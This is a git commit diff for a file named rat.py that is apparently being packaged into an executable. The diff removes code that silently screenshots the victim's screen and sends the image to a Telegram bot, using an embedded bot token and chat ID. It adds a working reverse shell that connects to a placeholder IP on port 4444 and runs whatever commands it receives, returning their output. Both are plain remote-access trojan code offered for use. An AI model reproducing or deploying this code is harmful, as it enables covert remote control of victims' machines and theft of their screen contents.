a8462fb086901a46550bd1382489f2bdc0b3541d
eroge-69 <erogexunamed@gmail.com>
2025-07-15 01:36:48 +0700

    Upload rat.py via PY to EXE tool

--- python-files/rat.py
+++ python-files/rat.py
@@ -1,14 +1,13 @@
-import telebot
-import pyautogui
+# rat.py
+import socket
+import subprocess
 
-bot = telebot.TeleBot("7375098459:AAELh2n9TTUrxWPdDd-9cJ2FB_LRfEi4y4o")
-CHAT_ID = 5843796841  
+s = socket.socket()
+s.connect(("YOUR_IP", 4444))
+while True:
+    command = s.recv(1024).decode()
+    if command.lower() == "exit":
+        break
+    output = subprocess.getoutput(command)
+    s.send(output.encode())
 
-# Делаем скриншот
-screenshot = pyautogui.screenshot()
-path = "screenshot.png"
-screenshot.save(path)
-
-# Отправляем скриншот
-with open(path, 'rb') as photo:
-    bot.send_photo(CHAT_ID, photo, caption="📸 Скриншот экрана")
